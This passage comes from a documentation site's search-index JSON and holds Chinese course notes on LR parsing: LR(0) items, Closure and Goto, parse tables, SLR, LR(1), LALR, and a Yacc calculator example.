RHS (Right-Hand-Side) of rule (e.g., X -&gt; A B C)</li> <li>pop the RHS from the top of stack (e.g., pop C B A)</li> <li>push the LHS onto the stack (e.g., push X)</li> </ul> </li> <li>Error:</li> <li>Accept: shift $ and can reduce what remains on stack to the start symbol!</li> </ul> </li> </ul> <p>\u90a3\u4e48\u8be5\u4f55\u65f6 shift, \u4f55\u65f6 reduce \u5462\uff1f</p> <p></p> <p>LR \u6587\u6cd5\u7684\u5173\u7cfb</p> \\[ \\text{LR(0)} \\subset \\text{SLR} \\subset \\text{LALR} \\subset \\text{LR(1)} \\] <p>\u5373\u4e00\u4e2a\u6587\u6cd5\u662f LR(0) \u6587\u6cd5\uff0c\u90a3\u4e48\u5b83\u4e00\u5b9a\u662f SLR \uff0c\u4ee5\u6b64\u7c7b\u63a8</p>"}, {"location": "Course/cp/parsing2/#lr0", "title": "LR(0) \u5206\u6790", "text": ""}, {"location": "Course/cp/parsing2/#lr0-nfa", "title": "LR(0) \u6587\u6cd5\u7684 NFA", "text": "<p>\u5177\u4f53\u64cd\u4f5c\u548c\u8ba1\u7b97\u4e2d\u4e0d\u4f1a\u8ba1\u7b97 NFA\uff0c\u53ea\u662f\u4e3a\u4e86\u7406\u89e3 LR(0) \u6587\u6cd5\u7684\u751f\u6210\u8fc7\u7a0b</p>"}, {"location": "Course/cp/parsing2/#_1", "title": "\u8bed\u6cd5\u5206\u6790\u601d\u8def", "text": "<p>LR(0) \u6587\u6cd5\u5c31\u662f\u81ea\u5e95\u5411\u4e0a\u5206\u6790\uff1a\u4e0d\u65ad\u51d1\u51fa\u4ea7\u751f\u5f0f\u7684 RHS, \u7136\u540e\u89c4\u7ea6\u4e3a LHS\uff0c\u76f4\u5230\u89c4\u7ea6\u4e3a\u5f00\u59cb\u7b26\u53f7</p> Example <p>\u5047\u8bbe\u4e0b\u4e00\u6b21\u5c06\u4f1a\u7528\u5230\u7684\u4ea7\u751f\u5f0f\u662f\uff1a\\(X \\rightarrow \\alpha \\beta\\), \u90a3\u4e48\u5728\u4f7f\u7528\u5b83\u5f52\u7ea6\u524d\uff0c\u6808\u9876 (\u53f3\u4fa7\u662f\u6808\u9876) \u53ef\u80fd\u5305\u542b\u4e09\u79cd\u60c5\u51b5\uff1a</p> <ol> <li>\\(\\dots\\)</li> <li>\\(\\dots \\alpha\\)</li> <li>\\(\\dots \\alpha \\beta\\)</li> </ol> <p>\u5373\u51d1\u51fa RHS \u7684\u8fdb\u5ea6\u4e0d\u540c</p> <p>\u5982\u4f55\u9488\u5bf9\u4e0d\u540c\u8fdb\u5ea6\u7684 RHS \u8fdb\u884c\u89c4\u7ea6\u5462\uff1f</p> <p>\u53ef\u4ee5\u7ef4\u62a4\u4e00\u4e2a\u72b6\u6001\uff0c\u8bb0\u5f55\u5f53\u524d\u5339\u914d\u7684\u8fdb\u5ea6</p> <p>\u9879/Item</p> <p>\u9879/Item: \u4e00\u4e2a\u4ea7\u751f\u5f0f\u52a0\u4e0a\u5728\u5176\u4e2d\u67d0\u5904\u7684\u4e00\u4e2a\u70b9 <code>\u00b7</code></p> <ul> <li>\u4f8b\u5982\u4ea7\u751f\u5f0f \\(A \\rightarrow \\cdot XYZ\\) \u6709\u56db\u4e2a Item<ul> <li>\\(A \\rightarrow \\cdot XYZ\\)</li> <li>\\(A \\rightarrow X \\cdot YZ\\)</li> <li>\\(A \\rightarrow XY \\cdot Z\\)</li> <li>\\(A \\rightarrow XYZ \\cdot\\)</li> <li>\u5176\u4e2d <code>\u00b7</code> \u8868\u793a\u5f53\u524d\u5339\u914d\u7684\u8fdb\u5ea6</li> <li>\u4f8b\u5982\uff1a\\(A \\rightarrow \\cdot XYZ\\) \u8868\u793a\u5f53\u524d\u5339\u914d/\u5f52\u7ea6\u5230\u4e86 RHS \u7684\u5f00\u5934</li> <li>\\(A \\rightarrow X \\cdot YZ\\) \u5df2\u7ecf\u5339\u914d/\u5f52\u7ea6\u5230\u4e86 \\(X\\)\uff0c\u671f\u671b\u5728\u63a5\u4e0b\u6765\u7684\u8f93\u5165\u4e2d\u7ecf\u8fc7\u626b\u63cf/\u5f52\u7ea6\u5f97\u5230 \\(YZ\\)\uff0c\u7136\u540e\u628a \\(XYZ\\) \u5f52\u7ea6\u5230 A</li> <li>\\(A \\rightarrow XYZ \\cdot\\) \u8868\u793a\u5df2\u7ecf\u5339\u914d/\u5f52\u7ea6\u5230\u4e86 \\(XYZ\\), \u53ef\u4ee5\u628a \\(XYZ\\) \u5f52\u7ea6\u4e3a \\(A\\)</li> </ul> </li> <li>Item \u8d77\u7684\u4f5c\u7528\u7c7b\u4f3c\u4e8e\u6709\u7a77\u81ea\u52a8\u673a\u7684\u72b6\u6001</li> </ul> <p>\u72b6\u6001\u8df3\u8f6c</p> <ul> <li>\u72b6\u6001\u8df3\u8f6c\uff1a\u4e00\u4e2a Item \u8bfb\u5165\u4e00\u4e2a token \u540e\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230\u53e6\u4e00\u4e2a Item</li> <li>\u4f8b\u5982\uff1a\\(A \\rightarrow \\cdot XYZ\\) \u53ef\u4ee5\u8df3\u8f6c\u5230 \\(A \\rightarrow X \\cdot YZ\\)</li> </ul> <ul> <li>\u7531\u4e8e\u6587\u6cd5\u4ea7\u751f\u5f0f\u662f\u6709\u9650\u7684\uff0c\u4e14\u6bcf\u4e2a\u4ea7\u751f\u5f0f\u53f3\u90e8\u7684\u957f\u5ea6\u4e5f\u662f\u6709\u9650\u7684\uff0c\u5373 Item \u7684\u6570\u91cf\u662f\u6709\u9650\u7684</li> <li>\u6709\u7a77\u81ea\u52a8\u673a\uff0c\u4e5f\u88ab\u79f0\u4e3a LR(0) \u81ea\u52a8\u673a</li> </ul> <p>\u6709\u4e86 Item \u548c\u72b6\u6001\u8df3\u8f6c\u7406\u8bba\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u63cf\u8ff0 LR(0) \u8bed\u6cd5\u5206\u6790\u601d\u8def\uff1a</p> <p>\u4f8b\uff1a</p> \\[ \\begin{align*}     &amp;S \\rightarrow b B B \\\\     &amp;S \\rightarrow \\cdot b B B \\leftarrow \\text{\u79fb\u8fdb\u72b6\u6001} \\\\     &amp;S \\rightarrow b \\cdot B B \\leftarrow \\text{\u5f85\u7ea6\u72b6\u6001} \\\\     &amp;S \\rightarrow b B \\cdot B \\leftarrow \\text{\u5f85\u7ea6\u72b6\u6001} \\\\     &amp;S \\rightarrow b B B \\cdot \\leftarrow \\text{\u89c4\u7ea6\u72b6\u6001} \\end{align*} \\] <p>LR \u5206\u6790\u5668\u57fa\u4e8e\u8fd9\u6837\u4e00\u4e9b\u72b6\u6001\u6765\u6784\u9020\u81ea\u52a8\u673a\u8fdb\u884c RHS \u7684\u8bc6\u522b</p>"}, {"location": "Course/cp/parsing2/#lr0-nfa_1", "title": "LR(0) \u7684 NFA", "text": "<p>\u4e3a LR(0) \u4e2d\u7684 NFA \u5b9a\u4e49\u4ee5\u4e0b\u6982\u5ff5\uff1a</p> <p>1) \u8d77\u59cb&amp;\u7ec8\u7ed3\u72b6\u6001</p> <ul> <li>\u6587\u6cd5 \\(G\\) \u4e2d\u589e\u52a0\u4e00\u4e2a\u65b0\u7684\u5f00\u59cb\u7b26\u53f7 \\(S'\\)\uff0c\u5e76\u52a0\u5165\u4ea7\u751f\u5f0f \\(S' \\rightarrow S\\$\\)</li> <li>\u6309 \\(S' \\rightarrow S\\$\\) \u5f52\u7ea6\uff0c\u8868\u793a\u5c06\u8f93\u5165\u7b26\u53f7\u4e32\u5f52\u7ea6\u4e3a\u5f00\u59cb\u7b26\u53f7 \\(S\\)</li> </ul> <p>\u52a0\u5165 \\(S'\\) \u662f\u4e3a\u4e86\u65b9\u4fbf\u8868\u793a\u8d77\u59cb\u548c\u7ec8\u7ed3\u72b6\u6001</p> <p>2) \u72b6\u6001\u8fc1\u79fb</p> <ul> <li>LR(0) Item \u4e4b\u95f4\u4f1a\u6709\u8f6c\u6362\u5173\u7cfb\uff0c\u5982</li> </ul> <ol> <li>\\(X \\rightarrow \\cdot \\alpha \\beta\\) \u63a5\u6536\u5230 \\(\\alpha\\) \u540e\uff0c\u8f6c\u79fb\u5230 \\(X \\rightarrow \\alpha \\cdot \\beta\\)</li> </ol> \\[ X \\rightarrow \\cdot \\alpha \\beta \\stackrel{\\alpha}{\\rightarrow} X \\rightarrow \\alpha \\cdot \\beta \\] <ol> <li>\u5982\u679c\u5b58\u5728\u4ea7\u751f\u5f0f \\(X \\rightarrow \\alpha Y \\beta\\), \\(Y \\rightarrow \\gamma\\), \u90a3\u4e48 \\(X \\rightarrow \\alpha \\cdot Y \\beta\\) \u53ef\u4ee5\u8f6c\u79fb\u5230 \\(Y \\rightarrow \\cdot \\gamma\\)</li> </ol> \\[ X \\rightarrow \\alpha \\cdot Y \\beta \\stackrel{\\epsilon}{\\rightarrow} Y \\rightarrow \\cdot \\gamma \\] <p>\u542b\u4e49\u662f\u5982\u679c\u5e0c\u671b\u770b\u5230\u7531 \\(Y \\beta\\) \u63a8\u5bfc\u51fa\u7684\u4e32\uff0c\u90a3\u4e48\u8981\u5148\u770b\u5230 $Y</p> NFA &amp; NFA-&gt;DFA <p></p>"}, {"location": "Course/cp/parsing2/#lr0-dfa", "title": "LR(0) \u6587\u6cd5\u7684 DFA \u548c\u5206\u6790\u8868", "text": "<p>Warning</p> <p>\u4ece\u8fd9\u91cc\u5f00\u59cb\uff0cLR \u81ea\u52a8\u673a\u5747\u6307 DFA</p> <p>\u4e0b\u9762\u8fdb\u5165 LR(0) \u81ea\u52a8\u673a\u6784\u9020\uff1a</p>"}, {"location": "Course/cp/parsing2/#closure", "title": "\u9879\u96c6\u95ed\u5305 CLOSURE", "text": "<pre><code>Closure(I) =\n    repeat\n        for each item [A -&gt; alpha \u00b7 X beta] in I\n            for each production X -&gt; gamma\n                add [X -&gt; \u00b7 gamma] to I\n    until I is unchanged\n</code></pre> <ul> <li>\\(I\\): a set of items (\u5373\u9879\u96c6)</li> <li>\\(X\\): a symbol (terminal or non-terminal)</li> </ul> <p>\u7c7b\u4f3c NFA \u8f6c DFA \u8fc7\u7a0b\u4e2d\u7684 \\(\\epsilon\\)-Closure</p> Example <p>\u5bf9\u4e8e\u6587\u6cd5\uff1a</p> \\[ \\begin{align*}     &amp;0: &amp;S' \\rightarrow S \\$ \\\\     &amp;1: &amp;S \\rightarrow x S \\\\     &amp;2: &amp;S \\rightarrow y \\end{align*} \\] <p>\u8ba1\u7b97\u9879\u96c61: \\(\\text{Closure}(\\{[S' \\rightarrow \\cdot S \\$]\\})\\)</p> \\[ \\textcolor{green}{1}~~ \\text{Closure}(\\{[S' -&gt; \\cdot S \\$]\\}) = \\begin{align*}     &amp;S' \\rightarrow \\cdot S \\$ \\\\     &amp;S \\rightarrow \\cdot x S \\\\     &amp;S \\rightarrow \\cdot y \\end{align*} \\]"}, {"location": "Course/cp/parsing2/#goto", "title": "Goto (\u72b6\u6001\u8f6c\u79fb\u51fd\u6570)", "text": "<pre><code>Goto(I, X) =\n    set J to empty\n    for each item [A -&gt; alpha \u00b7 X beta] in I\n        add [A -&gt; alpha X \u00b7 beta] to J\n    return Closure(J)\n</code></pre> <p>GOTO(\\(I\\), \\(X\\)) \u5b9a\u4e49\u4e3a \\(I\\) \u4e2d\u6240\u6709\u5f62\u5982 \\([A \\rightarrow \\alpha \\cdot X \\beta]\\) \u7684\u9879\u6240\u5bf9\u5e94\u7684\u9879 \\([A \\rightarrow \\alpha X \\cdot \\beta]\\) \u7684\u96c6\u5408\u7684\u95ed\u5305</p> Example <p>\u5bf9\u4e8e\u6587\u6cd5\uff1a</p> \\[ \\begin{align*}     &amp;0: &amp;S' \\rightarrow S \\$ \\\\     &amp;1: &amp;S \\rightarrow x S \\\\     &amp;2: &amp;S \\rightarrow y \\end{align*} \\] <p>\u9879\u96c62 = Goto(\u9879\u96c61, x) = \\(\\text{Closure}(\\{S \\rightarrow x \\cdot S\\})\\)</p> \\[ \\textcolor{green}{2}~~ \\text{Goto}(\\text{\u9879\u96c61}, x) = \\text{Closure}(\\{S \\rightarrow x \\cdot S\\}) = \\begin{align*}     &amp;S \\rightarrow x \\cdot S \\\\     &amp;S \\rightarrow \\cdot x S \\\\     &amp;S \\rightarrow \\cdot y \\end{align*} \\]"}, {"location": "Course/cp/parsing2/#lr0_1", "title": "LR(0) \u81ea\u52a8\u673a\u7684\u6784\u9020", "text": "Abstract <p>\u5927\u81f4\u601d\u60f3\u5c31\u662f\u4ece\u8d77\u59cb\u9879\u96c6\u5f00\u59cb\uff0c\u5bf9\u91cc\u9762\u7684\u6bcf\u4e2a\u9879\u8fdb\u884c goto \u5c1d\u8bd5\uff0c\u6784\u9020\u51fa\u65b0\u7684\u9879\u96c6 (\u8f6c\u79fb\u5230\u7684\u751f\u6210\u5f0f\u7684 Closure \u95ed\u5305)\uff0c\u4e00\u76f4\u9012\u5f52\u4e0b\u53bb\uff0c\u76f4\u5230\u6ca1\u6709\u65b0\u7684\u9879\u96c6\u4ea7\u751f</p> <ul> <li>\\(I\\): a set of items (\u5373\u9879\u96c6)</li> <li>\\(X\\): a symbol (terminal or non-terminal)</li> <li>\\(T\\): the set of states in the DFA</li> <li>\\(S\\): the set of (shift or goto) edges in the DFA</li> <li>\\(\\text{edge}(I, J, X)\\): \u8868\u793a\u4ece\u72b6\u6001 \\(I\\) \u7ecf\u8fc7\u8f93\u5165 \\(X\\) \u8f6c\u79fb\u5230\u72b6\u6001 \\(J\\)</li> </ul> <pre><code>Initialize T to {Closure({[S' -&gt; \u00b7 S $]})}\nInitialize E to empty\nrepeat\n    for each state I in T\n        for each item A -&gt; alpha \u00b7 X beta in I\n            let J = Goto(I, X)\n            if J is not in T\n                add J to T\n            add edge (I, J, X) to E\nuntil E and T is unchanged\n</code></pre> <p>\u5305\u542b \\(S' \\rightarrow S \\cdot \\$\\) \u7684\u9879\u96c6\u662f LR(0) \u81ea\u52a8\u673a\u7684\u7ec8\u6b62\u72b6\u6001</p> Example <p></p>"}, {"location": "Course/cp/parsing2/#dfa", "title": "DFA \u5230\u5206\u6790\u8868", "text": "<p>\u8981\u4ea7\u751f LR parser, \u6211\u4eec\u9700\u8981\u521b\u5efa Action \u548c GOTO \u8868</p> <p>Shift</p> <p>Shift: \u8f93\u5165\u7684 token \u662f\u4e00\u4e2a terminal</p> <p>\u4f8b\u5982\u8868\u4e2d T[i, t] = sn \u8868\u793a state i \u8bfb\u5165terminal t \u540e\uff0c\u8f6c\u79fb\u5230 state n</p> <p>Reduce</p> <p>Reduce: state i \u5305\u542b\u7684\u9879\u4e2d\u6709\u4e00\u4e2a\u5f62\u5982 \\(A \\rightarrow \\alpha \\cdot\\) \u7684\u9879 (\u70b9\u5728\u6700\u53f3\u8fb9)</p> <p>\u4f8b\u5982\u8868\u4e2d T[i, each terminal] = rk \u8868\u793a state i \u5f52\u7ea6\u4e3a\u4ea7\u751f\u5f0f k (k \u8868\u793a\u4ea7\u751f\u5f0f\u7684\u7f16\u53f7)</p> <p>Accept</p> <p>Accept: state i \u5305\u542b\u7684\u9879\u4e2d\u6709\u4e00\u4e2a\u5f62\u5982 \\(S' \\rightarrow S \\cdot \\$\\) \u7684\u9879</p> <p>\u4f8b\u5982\u8868\u4e2d T[i, \\(] = a\\) \u8868\u793a state i \u63a5\u53d7 \\(\\$\\) \u7b26\u53f7\u81f3\u6b64\u5b8c\u6210\u5206\u6790</p> <p>GOTO</p> <p>GOTO: \u8f93\u5165\u7684 token \u662f\u4e00\u4e2a non-terminal</p> <p>\u4f8b\u5982\u8868\u4e2d T[i, X] = gn \u8868\u793a state i \u8bfb\u5165 non-terminal X \u540e\uff0c\u8f6c\u79fb\u5230 state n</p> Example <p></p>"}, {"location": "Course/cp/parsing2/#lr", "title": "LR \u8bed\u6cd5\u5206\u6790\u7b97\u6cd5", "text": "<ul> <li> <p>\u4f7f\u7528\u6808 Stack, \u6808\u4e2d\u5b58\u653e LR \u81ea\u52a8\u673a\u7684\u72b6\u6001</p> </li> <li> <p>Shift(n):</p> <ul> <li>Advance input one token</li> <li>Push state n on the stack</li> </ul> </li> <li>Reduce(k):<ul> <li>Pop stack as many times as the number of symbols in the RHS of production k</li> <li>\u5047\u5982 \\(X\\) \u662f production k \u7684 LHS, \u90a3\u4e48\u5c06 \\(X\\) \u7684 GOTO \u503c\u538b\u5165\u6808</li> </ul> </li> <li>Accept: Stop parsing and report success</li> <li>Error: Stop parsing and report failure</li> </ul> <ul> <li>This is a general algorithm and can be used by other LR parsing For LR(0), we do not need to look up input symbol to know whether we should shift or reduce</li> </ul> pseudo code <p></p> \u5b8c\u6574\u7684 LR(0) \u8bed\u6cd5\u5206\u6790 <p></p> \u5173\u4e8eLR(0)\u4e2d\u7684 0 <p>\u4e3a\u4ec0\u4e48\u8bf4 LR(0) \u6ca1\u6709 Lookahead?</p> <ul> <li>LR(0) Item \u4e2d\u6ca1\u6709 lookahead terminal \u7b49\u4fe1\u606f</li> <li>\u201c\u662f\u5426\u5f52\u7ea6\u3001\u9009\u62e9\u54ea\u4e2a\u4ea7\u751f\u5f0f\u89c4\u7ea6\u201d \u4ec5\u7531\u6808\u9876\u72b6\u6001\u51b3\u5b9a</li> </ul> <p>LR(0) \u7684\u5c40\u9650\u5c31\u662f\u5bf9\u4e8e\u67d0\u4e9b\u6587\u6cd5\uff0c\u4f1a\u76f2\u76ee\u5730\u8fdb\u884c\u5f52\u7ea6\uff0c\u4ece\u800c\u5bfc\u81f4 shift-reduce conflict</p> Example <p></p>"}, {"location": "Course/cp/parsing2/#slr", "title": "SLR \u5206\u6790", "text": "<p>SLR(1) \u5c31\u662f\u4f7f\u7528\u66f4\u591a\u7684\u4fe1\u606f\u6765\u6307\u5bfc\u5f52\u7ea6\u64cd\u4f5c</p> <p>\u56e0\u4e3a \u201cLR \u5206\u6790\u76f8\u5f53\u4e8e\u6700\u53f3\u63a8\u5bfc\u7684\u9006\u8fc7\u7a0b\u201d\uff0c\u90a3\u4e48\u6bcf\u4e00\u6b21\u5f52\u7ea6\u64cd\u4f5c\u5e94\u8be5\u6ee1\u8db3\uff1a\\(t \\in \\text{Follow}(E)\\)</p> <ul> <li>\\(E\\) \u8868\u793a\u7528\u6765\u5f52\u7ea6\u7684\u4ea7\u751f\u5f0f\u7684 LHS</li> <li>\\(t\\) \u8868\u793a\u4e0b\u4e00\u4e2a token</li> </ul> <p>\u5bf9\u4e8e SLR(1), Put reduce actions into the table only where indicated by the FOLLOW set</p> <p>Attention!</p> <p>SLR(1) Parsing \u76f8\u5f53\u4e8e LR(0) \u5c31\u4ec5\u5728 Reduce \u65f6\u4e0d\u540c:</p> <p></p> Example <p></p> <p>SLR \u89e3\u51b3\u51b2\u7a81\u7684\u65b9\u6cd5\u662f\uff1a\u53ea\u6709\u4e0b\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7\u5728\u67d0\u4e2a\u53e5\u578b\u4e2d\u53ef\u4ee5\u8ddf\u7740 \\(A\\) \u4e4b\u540e (\u5373 \\(x\\in \\text{Follow}(A)\\)), \u624d\u80fd\u8fdb\u884c \\(A \\rightarrow \\alpha\\) \u5f52\u7ea6</p> <p>\u4f46\u4ecd\u7136\u5b58\u5728\u95ee\u9898\uff1a</p> <ul> <li>LR \u5206\u6790\u8fc7\u7a0b\u662f\u6700\u53f3\u63a8\u5bfc\u7684\u9006\uff0c\u90a3\u4e48\u6bcf\u4e00\u6b65\u63a8\u5bfc\u90fd\u5e94\u8be5\u662f\u6700\u53f3\u53e5\u578b</li> <li>\u5982\u679c \\(\\beta A x\\) \u4e0d\u662f\u4efb\u4f55\u6700\u53f3\u53e5\u578b\u7684\u524d\u7f00\uff0c\u90a3\u4e48\u5c3d\u7ba1 \\(x \\in \\text{Follow}(A)\\), \u4e5f\u4e0d\u5e94\u8be5\u8fdb\u884c \\(A \\rightarrow \\beta\\) \u7684\u5f52\u7ea6</li> </ul>"}, {"location": "Course/cp/parsing2/#lr1", "title": "LR(1) \u5206\u6790", "text": "<p>LR(1) \u9879\u4e2d\u5305\u542b\u66f4\u591a\u4fe1\u606f\u6765\u6d88\u9664\u4e00\u4e9b\u5f52\u7ea6\u52a8\u4f5c\uff0c\u4e0d\u4ec5\u7528\u5230 FOLLOW \u96c6\uff0c\u8fd8\u7528\u5230\u4e86 FIRST \u96c6</p> <p>\u5b9e\u9645\u7684\u505a\u6cd5\u76f8\u5f53\u4e8e \u201c\u5206\u88c2\u201d \u4e00\u4e9b LR(0) \u72b6\u6001\uff0c\u7cbe\u786e\u6307\u660e\u4f55\u65f6\u5e94\u8be5\u5f52\u7ea6</p> <p>LR(1) \u7684 Item</p> <p>LR(1) \u9879\u7684\u5f62\u5f0f\u662f\u5f62\u5982\uff1a\\(A \\rightarrow \\alpha \\cdot \\beta, \\color{red}{a}\\)</p> <ul> <li>\\(\\color{red}{a}\\) \u79f0\u4e3a\u5411\u524d\u770b\u7b26\u53f7\uff0c\u53ef\u4ee5\u662f\u7ec8\u7ed3\u7b26\u53f7\u6216\u8005 \\(\\$\\)</li> <li>\u5411\u524d\u770b\u7b26\u53f7 (\u4e32) \u7684\u957f\u5ea6\u5373\u4e3a \\(LR(k)\\) \u4e2d\u7684 \\(k\\)</li> </ul> <p>Closure \u95ed\u5305</p> <p></p> <p>Goto \u8f6c\u79fb</p> <p></p> <p>Reduce Action</p> <p></p> Example <p></p> <p>\u7531\u6b64\u53ef\u4ee5\u5f97\u5230 LR(1) \u7684\u5206\u6790\u8868</p> <p>\u540c\u65f6\u4e5f\u53ef\u4ee5\u770b\u5230 LR(1) Parsing \u7684\u5c40\u9650\u5c31\u662f\u5176 parsing table \u4f1a\u975e\u5e38\u5927\uff0c\u5bfc\u81f4\u4e0d\u9002\u7528\u4e8e\u5b9e\u9645\u5e94\u7528</p>"}, {"location": "Course/cp/parsing2/#lalr", "title": "LALR \u5206\u6790", "text": "<p>\u4e00\u4e9b\u72b6\u6001\u5728 LR(1) \u4e2d\u53ea\u4e0d\u8fc7\u662f lookahead symbol \u4e0d\u540c, \u6bd4\u5982\u4e0b\u56fe\u4e2d\u7684\u9879\u96c6 6 \u548c 13</p> <p></p> <p>LALR(1) \u76f8\u8f83\u4e8e LR(1) \u5c31\u662f\u5bf9\u4e8e\u4efb\u610f\u7684\u4e24\u4e2a\u9879\u96c6\uff0c\u5982\u679c\u4ed6\u4eec\u53ea\u6709 lookahead symbol \u4e0d\u540c\uff0c\u90a3\u4e48\u5c31\u5408\u5e76\u8fd9\u4e24\u4e2a\u9879\u96c6</p> <p></p> <p>\u4e0b\u9762\u4ecb\u7ecd\u5982\u4f55\u4ece LR(1) \u8fc7\u6e21\u5230 LALR(1)</p> <p>\u9996\u5148\u5f15\u5165 core \u6982\u5ff5\uff0ccore \u662f\u4e00\u4e2a\u9879\u96c6\u4e2d\u53bb\u6389 lookahead symbol \u7684\u90e8\u5206</p> <ul> <li>\u4f8b\u5982 \\(A \\rightarrow \\alpha \\cdot \\beta, a\\) \u7684 core \u662f \\(A \\rightarrow \\alpha \\cdot \\beta\\)</li> </ul> <p>\u6784\u9020 LALR(1) Parsing DFA \u5c31\u662f\uff1a</p> <p>Repeat until all states have distinct cores:</p> <ul> <li>\u9009\u62e9\u6709\u76f8\u540c core \u7684\u4e0d\u540c\u72b6\u6001</li> <li>\u901a\u8fc7\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5305\u542b\u6240\u6709 item \u7684\u72b6\u6001\u6765\u5408\u5e76\u8fd9\u4e9b\u72b6\u6001</li> <li>\u4ee4\u4e4b\u524d\u7684\u524d\u4e00\u72b6\u6001\u6307\u5411\u65b0\u72b6\u6001\uff1b\u65b0\u72b6\u6001\u6307\u5411\u6240\u6709\u5408\u5e76\u524d\u7684\u72b6\u6001\u7684\u7ee7\u627f\u8005</li> </ul> <p></p> Example <p></p>"}, {"location": "Course/cp/parsing2/#yacc", "title": "Yacc", "text": "<ul> <li>\u8bed\u6cd5\u5206\u6790\u7684\u751f\u6210\u5668 Yacc (Yet Another Compiler Compiler)</li> <li>\u57fa\u4e8e LALR(1)\uff0c\u7528 BNF (Backus-Naur Form) \u63cf\u8ff0\u6587\u6cd5</li> <li>Yacc \u7684 GNU \u7248\u672c\u662f Bison</li> </ul> <p>Lex \u548c Yacc \u4e00\u8d77\u4f7f\u7528\uff0cLex \u7528\u4e8e\u8bcd\u6cd5\u5206\u6790 (.l \u6587\u4ef6)\uff0cYacc \u7528\u4e8e\u8bed\u6cd5\u5206\u6790 (.y \u6587\u4ef6)</p> <ul> <li>\u6e90\u6587\u4ef6\u7ecf\u8fc7 <code>yylex()</code> \u51fd\u6570\u5206\u6790\u540e\uff0c\u8fd4\u56de token\uff0c\u7136\u540e\u4f20\u9012\u7ed9 <code>yyparse()</code> \u51fd\u6570\u8fdb\u884c\u8bed\u6cd5\u5206\u6790</li> </ul>"}, {"location": "Course/cp/parsing2/#yacc_1", "title": "Yacc \u6e90\u7a0b\u5e8f\u7684\u7ed3\u6784", "text": "<pre><code>\u58f0\u660e\n%%\n\u7ffb\u8bd1\u89c4\u5219\n%%\n\u8f85\u52a9\u6027 C \u8bed\u8a00\u4f8b\u7a0b\n</code></pre> <ul> <li>\u58f0\u660e\u90e8\u5206\uff1a\u653e\u7f6e C \u8bed\u8a00\u7684\u58f0\u660e (\u5982\u5b8f\u5b9a\u4e49\u3001\u5168\u5c40\u53d8\u91cf\u7b49)\uff0c\u4ee5\u53ca\u8bcd\u6cd5\u5355\u5143\u7684\u58f0\u660e</li> <li>\u7ffb\u8bd1\u89c4\u5219\u90e8\u5206\uff1a\u6307\u660e\u4ea7\u751f\u5f0f\u53ca\u76f8\u5173\u7684\u8bed\u4e49\u52a8\u4f5c</li> <li>\u8f85\u52a9\u6027 C \u8bed\u8a00\u4f8b\u7a0b\uff1a<ul> <li>\u88ab\u76f4\u63a5\u62f7\u8d1d\u5230\u751f\u6210\u7684 C \u8bed\u8a00\u6e90\u7a0b\u5e8f\u4e2d</li> <li>\u53ef\u5728\u8bed\u4e49\u52a8\u4f5c\u4e2d\u8c03\u7528</li> <li>\u5305\u62ec <code>yylex()</code>\uff0c\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u8bcd\u6cd5\u5355\u5143\uff0c\u53ef\u4ee5\u7531 Lex \u751f\u6210</li> </ul> </li> </ul>"}, {"location": "Course/cp/parsing2/#yacc_2", "title": "Yacc \u4f7f\u7528", "text": "\u6587\u6cd5<pre><code>exp -&gt; exp addop term | term\naddop -&gt; + | -\nterm -&gt; term mulop factor | factor\nmulop -&gt; *\nfactor -&gt; ( exp ) | number\n</code></pre> yacc \u6587\u4ef6<pre><code>%{\n#include &lt;stdio.h&gt;\n#include &lt;ctype.h&gt;\nint yylex(void);\nint yyerror(char *s);\n%}\n\n%token NUMBER\n%%\ncommand: exp { printf(\"%d\\n\", $1); };\nexp: exp '+' term { $$ = $1 + $3; }\n    | exp '-' term { $$ = $1 - $3; }\n    | term { $$ = $1; }\n;\nterm: term '*' factor { $$ = $1 * $3; }\n    | factor { $$ = $1; }\n;\nfactor: '(' exp ')' { $$ = $2; }\n    | NUMBER { $$ = $1; }\n;\n</code></pre> <p>Rules</p> <ul> <li><code>Rule {Action Code}</code></li> <li>Action Code \u4f1a\u5728\u4f7f\u7528\u8fd9\u4e2a\u89c4\u5219\u5f52\u7ea6\u540e\u6267\u884c</li> </ul> <p>\u5176\u4e2d\u5bf9\u4e8e\u8bed\u4e49\u52a8\u4f5c\uff1a \\(\\$\\$ = \\$1 + \\$3\\), \\(\\$\\$\\) \u8868\u793a\u548c\u4ea7\u751f\u5f0f\u5934\u76f8\u5173\u7684\u5c5e\u6027\u503c\uff0c\\(\\$i\\) \u8868\u793a\u4ea7\u751f\u5f0f\u4f53\u4e2d\u7b2c \\(i\\) \u4e2a\u7b26\u53f7\u7684\u5c5e\u6027\u503c</p> Info <p>lex\u4e0eyacc/flex\u4e0ebison\u5165\u95e8</p> Yacc \u6587\u4ef6\u683c\u5f0f\u4e2d\u7684\u51e0\u4e2a\u95ee\u9898 <ul> <li>\u6d88\u9664\u4e8c\u4e49\u6027: \u4e3a\u7b97\u7b26\u6307\u5b9a\u4f18\u5148\u7ea7\u4e0e\u7ed3\u5408\u5f8b</li> </ul> Example <pre><code>%left '+' '-'\n%left '*' '/'\n%right UMINUS /* \u4e00\u5143\u51cf\u53f7 */\n%right '^' /* \u6307\u6570\u8fd0\u7b97 */\n</code></pre> <ul> <li>\u51b2\u7a81\u89e3\u51b3<ul> <li>\u5f52\u7ea6/\u5f52\u7ea6\u51b2\u7a81\uff1a\u9009\u62e9 Yacc \u8bf4\u660e\u4e2d\u5148\u51fa\u73b0\u7684\u4ea7\u751f\u5f0f</li> <li>\u79fb\u8fdb/\u5f52\u7ea6\u51b2\u7a81\uff1a\u79fb\u8fd1\u4f18\u5148</li> <li>\u66f4\u901a\u7528\u7684\u65b9\u6cd5: \u6539\u5199\u6587\u6cd5\u4ee5\u6d88\u9664\u51b2\u7a81 (\u4f8b\u5982, \u6d88\u9664\u4e8c\u4e49\u6027\u7684\u540c\u65f6\u4e5f\u53ef\u80fd\u51cf\u5c11\u4e86\u51b2\u7a81)</li> </ul> </li> </ul>"}, {"location": "Course/cp/parsing2/#_2", "title": "\u9519\u8bef\u6062\u590d", "text": "<p>\u8fd9\u90e8\u5206\u4e86\u89e3\u5c31\u884c\u4e86</p> <p>Motivation</p> 